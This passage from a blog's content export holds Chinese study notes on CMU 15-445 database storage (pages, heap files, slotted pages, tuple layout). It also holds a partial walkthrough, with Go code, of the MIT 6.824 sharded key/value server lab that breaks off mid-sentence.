我们可以将它压缩成一个定长的数据或是对可变长数据进行填充，让他的长度变成我们所允许的最大长度。 对于大多数系统而言，它们都使用Fixed-length Offsets的方法来定位tuple的属性。 Embedded tuple id 该方法中，我们为列中的每一个值都保存一个主键或是标识符，通过这个主键或是标识符来定位tuple的属性（上图右侧示例） 但这种方法是很糟糕的，因为我们要为每一个值额外花费32位或是64位的空间来保存它们的标识符，这是十分浪费的，所以大多数系统不使用这种方法。 总结一下列存储模型，对于列存储模型而言，它的优点是当我们进行OLAP查询时，可以显著降低无用I/O操作的数量，它不会读取我们不需要的page，借此提高系统的性能，并且它能够更好的支持压缩。但它的缺点也十分显著，由于我们将一个tuple的所有属性分开存储，当我们要读取或更新一条tuple时，就需要读取多个page，并将这些page中的属性拼接起来。 总结我们明白了，数据库的存储管理不应该完全独立于DBMS的其他部分，即对于DBMS的其他部分而言，存储管理不应该是个黑盒。当我们的数据库知道它要做什么，数据看起来是怎样的，它就能够更好的做出判断以及设计选择，并更加高效的执行查询操作。 另一方面，我们了解了OLTP和OLAP，在OLTP中，我们使用行存储，在OLAP中，我们使用列存储，简单的规则能够让我们的职业生涯更加轻松。 这两节课中，我们讨论了DBMS如何在磁盘上表示文件，下节课我们会讨论如何将数据放入内存，并对它们进行管理。","categories":[{"name":"cmu15-445","slug":"cmu15-445","permalink":"http://yoursite.com/categories/cmu15-445/"}],"tags":[]},{"title":"CMU15-445学习笔记-数据库存储part1","slug":"cmu15-445-数据库存储part1","date":"2020-05-14T15:33:41.000Z","updated":"2020-08-30T04:03:57.379Z","comments":true,"path":"2020/05/14/cmu15-445-数据库存储part1/","link":"","permalink":"http://yoursite.com/2020/05/14/cmu15-445-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8part1/","excerpt":"","text":"Overview第一节课中我们学到了从使用者的角度如何看待数据库，也学会了如何编写sql语句从数据库中读写数据，在后续的课程里我们将会学习如何构建一个数据库管理软件。 面向磁盘型数据库系统每次我们要访问的数据都不在内存中，我们需要访问磁盘来得到我们需要的数据。在设计我们的软件时，需要设计一系列的组件来保护我们的系统。（有时会出现数据丢失，保存无效或错误数据等情况） 易失型存储和非易失型存储 存储设备层次 图中虚线上方的存储设备属于易失型存储，而虚线下方的属于非易失型存储，不同存储设备的访问速度从上到下递减，容量大小从上到下递增。 当电源断开时，易失型存储中的数据将会消失，而不能持续的存在。对于存储在易失型存储中的数据，它支持快速随机访问，当以不同顺序访问不同位置的数据的延迟和速度都大致相同。它具有字节可寻址能力，即当我想读取64byte数据时，我也只得到64byte数据，也许大家觉得这理所当然，但是块可寻址的做法并不是这样。同时具有字节一般我们称DRAM中的东西为内存。 而易失型存储中的数据即使在断电后也能被持久性的保存。对于大部分非易失型存储（如磁盘），它一般支持的是顺序访问，这意味着访问不同位置的数据的延迟和速度会有差异，当读写一段连续的块中的内容时会更有效率，所以我们尽可能希望按序读取数据。另一方面，它不想DRAM一样具有字节可寻址能力，它具备的是块寻址能力，当我们要访问非易失型存储中的数据时，我们得到的一般是数据所在的块或页（可以看作是同一个东西），假如我们只想要64byte的数据，我们也不得不把整个大小为4KB的页读出来。 在数据库中，我们需要将数据从磁盘（非易失型存储）移动到内存（易失型存储）。 在图中的分割线处还有一类新的非易失型存储设备（e.g Intel傲腾内存），它像DRAM那样具有字节可寻址能力，又能够在断电后持久性保存数据。目前这种设备还未被大量使用，但是Andy认为它是数据库未来的方向。 可以看到不同设备的访问耗时有着巨大的差异，这意味着我们需要最小化从磁盘读取数据的影响，如果我们每次都要从磁盘读取数据，那么数据库的运行效率将十分惨淡。 系统设计目标我们希望在数据库系统中达成的目标是给上层的应用程序一种错觉，即我们能够提供足够的内存将整个数据库存入内存中。即我们想要存储的数据库超出了可用内存的大小，但我们不必每次停下去读取或写入某些东西。 这几节课的内容就是关于如何最小化每次从磁盘读取内容或运行查询时所带来的影响（多线程，缓存，提前计算相关数据）。 查询过程 上层的应用向buffer缓存池请求读取page2的内容，这时page2不在内存中，我们再从磁盘的page目录中查找到page2，并将其放入内存缓冲池中，再由buffer将page2的指针提交给上层 为什么不使用OS这个过程像是操作系统中的虚拟内存的工作机制，我们为什么要在数据库中再做这样的内存管理呢？ 在OS的术语中，我们可以使用mmap实现上述机制。如果我们使用OS来帮我们进行内存的管理，这就意味着我们放弃了对数据的直接控制权。OS不关心数据库的行为，它不知道数据库想要做什么，它只知道数据的读写，而不知道高层的语义。这会导致数据库需要使用更多的机制来提示OS的操作，但是我们始终无法完全控制OS完全按照我们的想法行动，这可能会导致许多性能瓶颈。 许多数据库都使用了mmap（levelDB,mongoDB，memSQL，SQLite），但它们大多数在发展过程中都逐渐摆脱了mmap，因为使用OS做内存管理会导致许多限制和性能瓶颈。（We known that Andy hate mmap） 而数据库明白查询的语义，它知道工作负载如何，它能够根据这些做出最佳选择，但OS不知道这些，它只知道一些底层的读写调用。OS就像一辆通用卡车，但我们能够像保时捷法拉利那样调整我们的系统，来做到更好的定制化， 如何用磁盘上的文件表示数据库如何将页存储在文件中数据库就是磁盘上的一堆文件。对于OS而言，它不知道这里面有什么，这只是一堆普通的二进制文件。但是这些数据文件的格式通常都是专用于某个数据库管理系统的，我们无法将SQLite文件导入mySQL中，反之亦然。 我们通常将文件存放在OS提供的文件系统中（Ex3，Ex4），我们使用文件系统的读写API对文件进行读写（提高数据库的可移植性和降低开发复杂度）。 存储管理器我们的课程lab将会构建一个存储管理器（存储引擎），它负责维护磁盘上的数据库文件，我们将这些文件组织为一个page的集合，我们的存储管理器将会跟踪在这些page上的所有读写操作。 数据库page一个page就是一个固定大小的数据块，我们将文件组织为这些块，它能够存储各种东西（数据，索引，日志，元数据），但是有些数据库要求page必须是self-contained的，即page中的所有信息你都需要知道如何去理解和解释。 举例说，我有一张表，我将表的元数据存入一个page，而表的所有tuple存入另一个page，但是现在磁盘烧了，存储元数据的那个page丢失了，那么我就无法解释存储tuple的那个page，我们不知道这里面的数据是什么。所以我们应该将元数据和tuple应该存放在一起，这样就满足了self-contained。 所以self-contained特性能够保证即使丢失了一个page，也不会影响其他page，许多系统通过它来进行容灾恢复。 每个page会被赋予一个唯一的内部标识符，我们会有一个indirection层来将一个pageID映射到集合中一个文件的某个位置（记录一个相对位置，当文件整体移动后，我们只需要知道文件的起始位置，就可以通过pageID得到数据对应的位置，因为页的大小是固定的，id*页的大小就能够得到offset） 我们需要明确数据库中讲的page和OS以及硬件层的page不完全相同。 对于硬件层和OS来说，一个page的大小一般为4KB，但数据库中page的大小是可调整的（512B~16KB），需要注意的是由于硬件层的page大小为4KB，这意味这当我对磁盘进行写入和刷新时，存储设备只能保证每次写入4KB时原子性的。 这就容易造成一个问题 例如我们将一个16KB的数据库page回写到磁盘 但是OS在写入前8KB后故障了 这个时候它并不会回滚，它只会继续把剩下8kb继续写入磁盘，这样会导致这16kb的数据被分裂成两部分，我们就不能使用了 page存储架构不同DBMS使用不同的方式管理磁盘上的page Heap file organization数据库中的heap文件是一个page的无序集合，即随机地把tuple存在其中，当我们将tuple一个接一个地插入，不能保证在磁盘的顺序和插入的顺序相同。 我们需要使用一些元数据来跟踪page，知道哪些page是空闲的，这样我们就可以将数据插入到空闲的page中。 我们可以通过不同的方式表示heap文件。 1.链表 我们需要在heap文件的头部中维护两个链表，一个是指向空闲page的链表，另一个是指向已保存数据page的链表。每次我们要插入数据的时候就在空闲page的链表中遍历查找一个大小合适的page来保存插入的数据。 2.page目录 page目录一样存放在heap文件的头部中，它里面维护了pageID和它们位置的映射关系，我们也可以在其中维护一些额外的元信息，例如每个page的空闲空间，当我想要插入一些数据的时候，我们就可以在page字典中查找到对应的page存放数据。 （类似hash Table） page目录 这时我们会遇到一些关于原子性操作的问题，当我们删除了一些数据和page，我们也需要修改page目录中的信息，表示这个page现在有空闲的空间了。但是这个过程不能保证是原子性的，有可能在我们修改page目录中的信息前，系统崩溃了，当系统恢复正常时，page目录中仍显示哪些我们已经删除数据的page是满的，但实际上它已经变成空闲的了。 也许我们可以在系统恢复后，对所有page进行一次扫描并更新对应的page目录信息。但在数据库中信息量非常大的情况（1PB），这个工作就显得不太可能完成。 我们后续会讨论采用一些机制来维护日志和初始的元数据，在系统崩溃后，我们仍然可以正确的恢复它。 （Q1：为什么数据库的page大小要设置的比OS和硬件层更大？ A1：这是一种权衡，在数据库内部，我们使用内存中的page目录来映射page的位置。如果我们使用更大的page，那么我们使用的pageID就更少，相应的page目录就更小，类似CPU中的TLB（页表缓存）；如果page设置的小，那么page目录就会变得很大，那么它就难以存放在高速缓存或是内存中。 我们可以讨论一下随机访问和顺序访问的问题，如果我们的数据库page是16KB，我们可以连续写出4个4KB的page（OS意义的page）来表示它，这其实一定程度上用到了顺序访问的特点。但是我们在写入的时候也需要增加许多机制来防止由于原子性导致的数据错误。所以不同的做法各有优缺点，这也是许多商业数据库允许你根据自己的需要调整数据库的原因。） （Q2：如果使用self-contained page，是否能够解决上述的原子性问题？ A2：不行，因为对于self-contained page，它只是表示元数据和tuple放在同一个数据page中。我们在修改数据时，一定需要做修改数据page和修改目录page这两步操作，原子性的问题并没有解决。） page头部每一个page中都有一个包含元数据的头部，头部中的数据一般包括： 1.page大小 2.Checksum（使用CRC,md5来检验出错） 3.数据库管理系统版本 4.transaction visibility（目前不太了解，就不翻译了) 5.compression information（同上） page布局对于任何page存储架构，我们需要理解如何在page内部存储和组织数据 我们可以通过两种方式表示一个page中的数据：(我们假设目前只存储tuple) 1.Tuple-oriented；2.log-structured 我们现在来看一看page内部是怎样的。 Tuple-oriented 首先来看一看最简单的一种做法 我们在page的头部中记录一个TupleNum，它表示目前存储的tuple的数量，每次插入一个新的tuple，我们就根据TupleNum来计算偏移量，将新的tuple插入到最后。 但是这么做很蠢，因为当我们要在中间删除一个tuple的时候，我们要将在它之后的大量tuple都向前移。 也许我们可以不必移动后面的tuple，而是将新的tuple插入到这个空位就行了，但这仍然不好，因为我们要存储的tuple可能是不定长的，可能这个空位不够大，无法容纳新的tuple。另一方面，这种做法要求我们在头部维护一个空位信息来告诉新插入的tuple，哪些位置是空位。 我们介绍一种更加通用的page存储策略：slotted page 首先在page的头部保存一些基本的元数据（checksum，访问时间等），并且我们有一个slot数组，它将一个特定的slot映射到page内的一个偏移量。而数据存储部分则在page的最后部分。我们可以通过查找slot数组来得到tuple的偏移量，并进一步查找得到数据。当tuple移动时，只需要更新slot数组的对应值就行。这样，当我们要查找一条tuple时，我们可以使用pageID和slot number来定位它。 我们填充page的方式是从前往后对slot数组进行填充，而数据则是从后向前填充（如图所示，对于tuple1而言，我们从page结束位置开始，减去tuple1的大小，这样就得到了tuple1的起始偏移量，并将它存到slot数组中），当我们的数据占用了page的一半大小时，将认为这个page已满，这样可能会留下一些空隙，但我们为了支持可变大小的tuple，不得不这么做。 （Q3：我怎么知道tuple1是存在slot1中的？ A3：我们识别tuple的方式是使用tupleId或recordId，它是一个用来表示一个tuple的逻辑地址，一般是由pageId加上offset或是slot来表示。 Andy分别使用PostgreSQL，SQLite，Oracle来展示不同的数据库如何定位一个tuple。 首先是PostgreSQL的例子，它使用属性ctid来定位不同tuple，（0，1）表示该tuple位于page0，slot1的位置 当我们删除id=102的tuple后得到下图的结果。 可以看到slot2被清空了，那么考虑一下如果这时我们再插入新的tuple，新的tuple会放在slot2还是slot4？ 答案是新的tuple会放在slot4（这只是代表PostgreSQL的做法） 在PostgreSQL中有一个类似于GC的东西，叫做vaccum，它会遍历所有page，并对它们进行整理，当它发现空闲空间，它会对这些page进行压缩。 这是我们执行vaccum后的结果，可以看到id=103的tuple被移动到slot2的空位上，后面的id=104的tuple也向前紧凑。 接下来看看在SQL server中是如何定位一个tuple SQL中使用File：Page：Slot这个属性清晰的告诉我们tuple的位置。 然后我们将第二条tuple删去，得到下图的结果。 再插入一条新的tuple看看，对于SQL server而言，它会将新的tuple放在哪个Slot。 从上图中看到，SQL server在更新pserverage时，它一旦发现了page中存在可用的空隙，那么它会将page做紧凑处理，然后再将数据写出到page上。所以我们会看到id=103的tuple从slot2被移动到slot1，而新插入的id=104的tuple被放在slot2。 最后我们看看Oracle的做法 Oracle使用rowID来定位tuple，但是显然rowID的数据我们看不懂，我们可以添加命令对他进行翻译，得到OBJID,FILENUM,BLOCKNUM,ROWSLOT这几项属性。 同样的，我们删去ID=102的tuple。 最后插入一条ID=104的tuple。 结果和PostgreSQL相似，新插入的tuple被放在了Slot3上，而不是存在空位的Slot1。 上面三个例子是不同数据库表示内部tuple的方法，SQL server会在我们写入数据时进行压缩，而PostgreSQL和Oracle则是把空的slot放在那里不管它。不同的数据库系统做不同的事情，这只是系统内部组织page的tuple的方法，它并不会影响系统的其他部分。 ） 页中的tuple是怎样的tuple布局对我们而言，tuple是一串字节，当我们取得了slot偏移量，我们向对应的位置写入一些字节，这就足够了。 但对于数据库而言，它需要能够解释这一串字节的实际含义。这也是我们需要有scheme的原因，scheme会记录不同属性的类型，这样我们可以知道tuple的大小，并进一步跳转到不同的偏移量处得到我想要的tuple。 上图是tuple的结构，在一个tuple内我们也需要一个头部来追踪不同的信息，例如哪一个事务查询修改了它，以及null值的位图。 通常情况下，我们不需要将tuple的元数据（这个tuple有几列，不同属性的类型等）保存在tuple内部。我们将这些高级的元数据保存在这个page里（整个page都存储同一个表的tuple）。 但是对于支持JSON和scheme的数据库（MongoDB），我们需要将元数据写在tuple内部，因为每一条tuple和记录都可能不同，所以我们要保存与其实际内容相关的元数据。 不同表的数据保存在同一个page大多数情况下，我们为了让page变得独立，我们不会想将不同表的tuple保存在同一个page中，这样我们不得不保存一大堆属于不同表的元数据。 在某些情况下，我们希望将一张表嵌入另一张表中，我们会使用join操作将不同的表进行内联，这时，我们可以将不同表的数据放在同一个page中。 举例来说，如下图所示，我们有foo和bar两个table，它们使用一个外键相关联。 通常情况下，我们会将这两张表分开保存在不同page中（如下图） 但是当我们想将两张表进行join操作时，我们会将bar的tuple直接内嵌在foo的tuple中，这样它们就被存放在同一个page中。（如下图） 这被称为反范式化，在内部我们会以这样的方式存储我们的page，在应用程序看来，它里面有两张相同的表，但在内部，我们的page实际上将它们合并到一起了。 总结数据库是通过page组织数据的 我们使用不同的方式来跟踪文件中的page 我们使用不同方式来存储page 在page中，我们可以用不同的方式存储tuple","categories":[{"name":"cmu15-445","slug":"cmu15-445","permalink":"http://yoursite.com/categories/cmu15-445/"}],"tags":[]},{"title":"MIT-6.824-lab4B-Sharded Key/Value Server","slug":"mit-6-824-lab4b-sharded-key-value-server","date":"2020-04-18T09:19:25.000Z","updated":"2020-08-30T04:47:35.601Z","comments":true,"path":"2020/04/18/mit-6-824-lab4b-sharded-key-value-server/","link":"","permalink":"http://yoursite.com/2020/04/18/mit-6-824-lab4b-sharded-key-value-server/","excerpt":"","text":"github: https://github.com/wwow1/MIT-6.824 在4A中我们完成了shardmaster的构建，那么下一步我们就需要完善shardmaster下层的分片kv存储系统。 在这个实验中，我们将数据进行分片处理，并将它们下放到不同的shardkv集群中进行管理。对于分片的内容和处理都应该对上层进行封装，简而言之，对于上层的用户而言，他的使用体验应该和lab3相同。而shardkv服务器向上层提供Get，Put，Append三个接口（它们的功能和lab3相同） 首先说明一下，我贴出的代码都是最终代码，所以在解释过程中大家可能发现某些代码的作用不太看得懂，那么可以先略过它们，等到后面看到错误解析的时候就会明白它们的作用 1.移植lab3代码 任务书上说，我们首先应该通过第一个测试，这个测试是静态的分片，我们不用考虑集群变化和分片迁移的问题，先把lab3中的代码抄过来（记得在common中的RPC结构中也要加上opnum和clientId） 在将lab3的代码转移过来的时候有一些需要修改的地方，我们看一看实验提供的client代码，可以看到对于每一次的Get，PutAppend的返回中，都需要根据reply.Err来决定下一步的操作，而在lab3中我没有使用到这个变量，所以我需要在server代码的RPC调用添加上对于Err的修改 （1）确定WrongLeader=true时，不需要管Err （2）WrongLeader=false， 且该请求已经被成功执行，则Err=OK （3）WrongLeader=false，但该请求的key不属于当前集群所负责的分片，Err=ErrWrongGroup 既然提到了对key的判断，那么也应该在server的Get和PutAppend中判断改key是否处于当前集群的管理中 12345func (kv *ShardKV) checkShard(key string) bool&#123; kv.mu.Lock() defer kv.mu.Unlock() return kv.configuration.Shards[key2shard(key)]!=kv.gid&#125; 123456789101112//server.go中Get和PutAppend的最前端_,isLeader:=kv.rf.GetState()if isLeader==false&#123; reply.WrongLeader=true return&#125;reply.WrongLeader=falseif kv.checkShard(args.Key)&#123; //判断key是否属于当前集群 reply.Err=ErrWrongGroup return&#125; 2.更新Config信息 现在我们的kv系统已经能够在静态分片的情况下工作了，那么下一步就需要解决集群更改的问题了 首先我们需要单独开启一个线程让它能够周期性的向shardmaster询问当前最新的集群信息（config），如果shardmaster发布了更新的集群信息，那么就需要更改自己的集群信息，然后更改集群配置 由于我的查询函数比较复杂，涉及到后面的一些细节，不便于在这一段讲解，所以我用文字给大家列一下执行步骤。 查询函数QueryConfig执行流程： （1）周期性地循环调用shardmaster的接口Query，来获得最新的下一个的Config（Query(kv.configuration.Num+1)) （2.1）如果shardmaster返回的newConfig.Num&gt;kv.Config,Num，就使用newConfig来替换当前config。并且如果当前函数执行者是集群的leader，那么它就应该对比newConfig和当前config得到需要更新的分片编号，然后调用sendShardMigrationRPC；如果不是leader就等待进入下一次循环 （2.2）如果newConfig.Num&lt;=kv.Config.Num，那么就等待进入下一次循环 3.分片迁移 然后我们再说一下sendShardMigrationRPC，我们知道当集群配置发生变化时，不同集群所负责的分片也会发生变化，某些分片可能从当前的集群迁移到另一个集群，sendShardMigrationRPC的作用就是负责分片的迁移，这里需要考虑一下到底是主动发送RPC去请求分片，还是等待对方将分片送过来。 实验指导书上面有提到，在shardkv server可以继续存储不属于它负责的分片，这将简化我们的工作。这也意味着，对于一个shardkv server而言，它不需要管那些即将离去的分片，因为它们根本就不影响自己的工作；但对于要接受这些分片的server而言，何时接收到这些新的分片将影响它们对于client request的响应，所以我选择由分片接收方主动请求分片 123456//傻瓜版的syncMap，主要用于整合sendShardMigrationRPC中得来的新分片type syncMap struct&#123; State map[string]string //key-&gt;value ApplyNum map[int64]int //clientId-&gt;opnum mu sync.Mutex&#125; 12345678910111213141516171819202122232425262728293031323334353637//sendShardMigrationRPC的主要代码//为了保证一致性，要求分片的转移只能在leader间进行，然后leader再通过raft实现//集群内部的一致性for _,v:=range newShards&#123; wg.Add(1) go func(value int)&#123; defer wg.Done() for&#123; if oldConfig.Shards[value]==0&#123; return &#125; if servers, ok := oldConfig.Groups[oldConfig.Shards[value]]; ok &#123; for si := 0; si &lt; len(servers); si++ &#123; srv := kv.make_end(servers[si]) args:=ShardMigrationArgs&#123;value,nowConfig.Num,oldConfig.Num&#125; var reply ShardMigrationReply ok := srv.Call(&quot;ShardKV.ShardMigration&quot;, &amp;args, &amp;reply) WrongLeader:=reply.WrongLeader if ok &amp;&amp; WrongLeader==false&#123; tmp.mu.Lock() for k,s:=range reply.State&#123; tmp.State[k]=s &#125; for k,s:=range reply.ApplyNum&#123; tmp.ApplyNum[k]=max(s,tmp.ApplyNum[k]) &#125; tmp.mu.Unlock() return &#125; &#125; &#125; time.Sleep(100 * time.Millisecond) &#125; &#125;(v)&#125;wg.Wait()kv.Migrate(nowConfig,tmp.State,tmp.ApplyNum)//将新的config和新的分片传入raft实现集群内一致 在这之后我们需要完善RPC handler-&gt;ShardMigration 首先我们必须要保证，分片是在两个leader之间迁移，这样才能保证一致性（后续会举例说明）。然后还需要保证对方的config.Num与自己相同或大于自己，如果对方的config小于自己的话，那么许多请求还没有被apply，这时它的分片数据还不够“新”，许多append和put请求也许处于已被提交到raft但还未被apply阶段，如果直接把现在的数据取过来之后，那些请求再被apply到原集群上，这就导致我们取到的数据是缺失的，所以需要通过config.Num来实现一个简单的数据同步 1234567891011121314//ShardMigration 参数结构type ShardMigrationArgs struct&#123; Shards int ConfigNum int LastConfigNum int //与下文提到的afterUpdateConfig相同，同样是为保证数据同步&#125;type ShardMigrationReply struct&#123; WrongLeader bool State map[string]string //key-&gt;value ApplyNum map[int64]int //clientId-&gt;opnum//实验书上有相关提示，用于防止request dup造成数据的错误&#125; 1234567891011121314151617181920212223242526272829303132333435363738func (kv *ShardKV) ShardMigration(args * ShardMigrationArgs, reply *ShardMigrationReply)&#123; _,isLeader:=kv.rf.GetState() if isLeader==false&#123; reply.WrongLeader=true return &#125; t0:=time.Now()//等待信息同步 for (kv.configuration.Num&lt;args.ConfigNum || kv.afterUpdateConfig&lt;args.LastConfigNum) &amp;&amp; time.Since(t0).Seconds()&lt;1&#123; time.Sleep(100*time.Millisecond) &#125; if kv.configuration.Num&lt;args.ConfigNum || kv.afterUpdateConfig&lt;args.LastConfigNum&#123; reply.WrongLeader=true return &#125;//传递状态信息和applyNum kv.mu.Lock() reply.State=make(map[string]string) reply.ApplyNum=make(map[int64]int) for k,v:=range kv.DB&#123; if key2shard(k)==args.Shards&#123; reply.State[k]=v &#125; &#125;//下面这部分可以先略过，在错误解析中会提及 for index,v:=range kv.applyNum&#123; shd,ok:=kv.ErrGroupApply[index] if ok &amp;&amp; args.Shards!=(int(shd[0])%shardmaster.NShards&#123; reply.ApplyNum[index]=v-1 &#125;else&#123; reply.ApplyNum[index]=v &#125; &#125; kv.mu.Unlock() reply.WrongLeader=false&#125; 4.提交newConfig 然后就是将新的集群信息传入raft实现集群内部一致性 123456789func (kv *ShardKV) Migrate(configuration shardmaster.Config,State map[string]string,ApplyNum map[int64]int) &#123; _,isLeader:=kv.rf.GetState() if isLeader==false&#123; return &#125; op:=Op&#123;&quot;updateConfig&quot;,0,UpdateConfig&#123;configuration,State,ApplyNum&#125;,0&#125; _,_,Leader:=kv.rf.Start(op) return&#125; Migrate这一部分的内容很简单，主题就是调用rf.Start，但是不知道大家会不会有一个疑问，在lab3中，我们在start后，不应该还需要等待结果来确认这个command是否真的被apply吗？ 原因就是即使我们等待后明白了这个config是否被正确apply了，也没有意义。假设知道了config成功apply，那么就直接返回，不需要保存信息。而假设config没有成功apply，那么原因大概率是因为leader改变了，“我”已经不是leader了，那么“我”也无法再主导一次新的rf.start，所以结果还是直接返回。既然如此，干脆就不等待apply的结果了，在调用了rf.start之后就return config update这个请求是由server集群自己产生的请求，而不是由client调用的请求，所以config提交失败之后不能返回client，也不能让client再次寻找新的leader提交请求。 但是如果我们不检验config update的结果的话，我们无法知道这个config是否成功的更新了，也许我们仅仅是再QueryConfig函数中更新了kv.configuration这一个变量，但是实际上的applyNum和DB都没有更新，那么就出大问题了 为了解决这个问题，我使用了一个新的变量afterUpdateConfig ，用它来记录已更新的config.Num。 然后我们需要进一步修改QueryConfig函数，这一次我们根据代码来实际分析一下整个函数流程 123456789101112131415161718192021222324252627282930313233343536373839//QueryConfig的主体_,isLeader:=kv.rf.GetState()afterUpdateConfig:=kv.afterUpdateConfigoldConfig = kv.mck.Query(afterUpdateConfig)//当前confignewConfig := kv.mck.Query(afterUpdateConfig+1)//下一个confiigif newConfig.Num &gt; kv.configuration.Num&#123; kv.mu.Lock() kv.configuration=newConfig kv.mu.Unlock() if isLeader&#123; //如果是leader，就需要确认新的分片 newShards:=make([]int,0) for i := 0; i &lt; shardmaster.NShards; i++ &#123; if newConfig.Shards[i] == kv.gid &amp;&amp; oldConfig.Shards[i] != newConfig.Shards[i] &#123; newShards = append(newShards, i) &#125; &#125; t0=time.Now() go kv.sendShardMigrationRPC(oldConfig,newShards) &#125;&#125;else if newConfig.Num &lt;= kv.configuration.Num &amp;&amp; oldConfig.Num&lt;newConfig.Num &amp;&amp; time.Since(t0).Seconds()&gt;1 &amp;&amp; isLeader&#123;//如果oldConfig.Num&lt;newConfig.Num说明这个新的config并没有真正的被apply//设置一个时间点，例如这里的1s，如果超出时限仍没有被apply//那么它有可能提交失败了，所以我们再次调用send...RPC重新获取分片并提交config t0=time.Now() var newShards []int for i := 0; i &lt; shardmaster.NShards; i++ &#123; if newConfig.Shards[i] == kv.gid &amp;&amp; oldConfig.Shards[i] != newConfig.Shards[i] &#123; newShards = append(newShards, i) &#125; &#125; go kv.sendShardMigrationRPC(oldConfig,newShards)&#125; 5.apply newConfig 在任务书中有提到，在我们进行一次集群变换的时候，是不应该接收新的client请求的，因为集群可能还没有实现真正意义上的更新（更新DB和applyNum），这时我们就需要在Get和PutAppend中添加等待 1234for kv.afterUpdateConfig&lt;kv.configuration.Num&#123;//条件满足说明新的config还没有被真正apply，则client的请求先搁置 time.Sleep(20*time.Millisecond)&#125; 当我们提交的updateConfig请求通过raft达到一致并被再次传递到shardkv中时，我们就需要使用updateConfig中的数据更新shardkv的状态信息和applyNum 首先我们需要在apply函数中增加一个对updateConfig的处理接口 1234567891011if op.Operation==&quot;updateConfig&quot;&#123; Command:=(op.Command).(UpdateConfig) kv.ApplyNewConfig(Command) kv.mu.Lock() if msg.Index&gt;kv.commitIndex&#123; kv.commitIndex=msg.Index kv.commitTerm=msg.Term &#125; kv.mu.Unlock() continue&#125; 然后转入ApplyNewConfig函数 12345678910111213141516171819202122232425262728293031func (kv *ShardKV) ApplyNewConfig(args UpdateConfig)&#123;//首先要保证我们的集群是一定不会回退的，通过集群号来鉴别过时的config if kv.afterUpdateConfig!=args.Configuration.Num-1&#123; return &#125; kv.mu.Lock()//有关ErrGroupApply的部分在错误解析部分会说明 for k,v:=range kv.ErrGroupApply&#123; if args.ApplyNum[k]&lt;kv.applyNum[k]&#123; delete(args.ApplyNum,k) delete(args.State,v) &#125; &#125; for k,v:=range args.ApplyNum&#123; kv.applyNum[k]=max(v,kv.applyNum[k]) &#125; for k,v:=range args.State&#123; kv.DB[k]=v &#125; //更新afterUpdateConfig kv.afterUpdateConfig=max(args.Configuration.Num,kv.afterUpdateConfig) //做一个“啰嗦”的保护 if kv.configuration.Num&lt;args.Configuration.Num&#123; kv.configuration=args.Configuration &#125; kv.mu.Unlock()&#125; 到此为止，我们的主要流程已经结束，但是debug之路才刚刚开始，我们需要根据错误反馈来进一步完善代码 6.错误解析和解决办法 问题1：分片迁移中的数据缺失1 首先，我一开始在QueryConfig中使用Query（-1）来定义newConfig，这样每次得到的newConfig都是最新的，而不一定是下一个config。 但是这就导致了一种情况出现，如果shardmaster一次更新了两个config，假设当前config信息为config0{shard[100,100,100]}（假设只有三个分片，shard数组内的数组表示负责该分片的集群编号），更新的第一个config信息为config1{shard[101,101,101]}，更新的第二个分片是config2{ shard[102,102,102]} 由于我们的QueryConfig是周期性的Query，所以在这种情况下，不同集群的config变化情况可能不同 对于gid101而言，它直接从config0更新到了config2，但是不管是在config0还是config2中，gid101都不负责任何分片，它也不参与任何分片迁移过程。但是对于gid102而言，它先更新到config1，再更新到config2，从config1更新到config2的过程中，它不参与分片迁移过程，但是从config1更新到config2时，它需要向gid101请求三个分片。但是我们知道，gid101根本就没有任何分片，那么gid102取到的分片全是空的，但实际上在config0时，gid100中的这三个分片的内容不是空的，这就导致我们的分片数据缺失了 造成这个错误的原因是由于不同集群的config变化情况不一致，所以我们修改了QueryConfig，使其每次只更新下一个config而不是最新的config。这样所有集群都会老老实实的从config0更新到config2，而不会发生有集群“跳步操作“造成它与其他集群的不一致 问题2：分片迁移中的数据缺失2 在ShardMigration中，一开始我没有使用到afterUpdateConfig，但是这导致了切片传递中的数据缺失 同样是问题1中的例子，假设gid102从config1更新到config2，而gid101正从config0更新到config1。这时gid102应该向gid101请求分片，但是gid101可能也正在向gid100请求分片，那么可能在gid101还未向gid100取完分片前，gid102就取完分片了，这种情况下，gid102只取到了部分分片。 12345678910//ShardMigration的前置判断//kv.afterUpdateConfig&gt;=args.LastConfigNum才向下执行for (kv.configuration.Num&lt;args.ConfigNum || kv.afterUpdateConfig&lt;args.LastConfigNum) &amp;&amp; time.Since(t0).Seconds()&lt;1&#123; time.Sleep(100*time.Millisecond)&#125;if kv.configuration.Num&lt;args.ConfigNum || kv.afterUpdateConfig&lt;args.LastConfigNum&#123; reply.WrongLeader=true return&#125; 为了解决这种问题，我们需要在取分片之前（ShardMigration）加上一个确认条件，即kv.afterUpdateConfig应该大于等于 args.LastConfigNum（就是afterUpdateConfig) 问题3：部分请求丢失 假设一种情况，数据A即将从gid100转移到gid101，一般来说，在转移过程中，server不会接受新的client请求，但是对于已经提交到raft但还未被shardkv apply的请求，无法被屏蔽。当数据A通过ShardMigration传递到gid101后，某个append{A,123}请求从raft被apply到shardkv，那么这个请求会被执行，并且会返回告知client，这个请求执行完成了。 那么下一次Get{A}的时候，就会发现数据A缺失了123，因为这个append123应该在gid101上被执行，但是它却在gid100被执行完了，并且这个数据没有更新到gid101上 为了解决这个问题，我在apply中也添加了一个checkShard(key)函数来检验请求是否正确，如果我们检测到了一个类似上述例子中apend{A,123}这样的请求，我们还是予以执行（个人选择，也可以选择不执行），但是会返回给client一个Err=ErrWrongGroup。 同时与ShardMigration中的前置判断条件相结合 12345678910//ShardMigration函数中的前置判断条件//kv.configuration.Num&gt;=args.ConfigNum才向下执行for (kv.configuration.Num&lt;args.ConfigNum || kv.afterUpdateConfig&lt;args.LastConfigNum) &amp;&amp; time.Since(t0).Seconds()&lt;1&#123; time.Sleep(100*time.Millisecond)&#125;if kv.configuration.Num&lt;args.ConfigNum || kv.afterUpdateConfig&lt;args.LastConfigNum&#123; reply.WrongLeader=true return&#125; 假设gid100更新了config，那么在apply中就会对当前请求设置reply.Err=ErrWrongGroup，使client向gid101重发append{A,123}请求。而如果gid100还未更新config，那么在ShardMigration就会卡住直到它更新config为止 从前面这几个错误解析中我们可以知道，ShardMigration中的前置判断条件是非常重要且缺一不可的 问题4：快速更新config导致状态信息与applyNum不匹配 在前面的基础上，考虑一种情况，数据A{key：A，value：0}从gid100转移到gid101，在转移过程中，gid100的raft向其shardkv 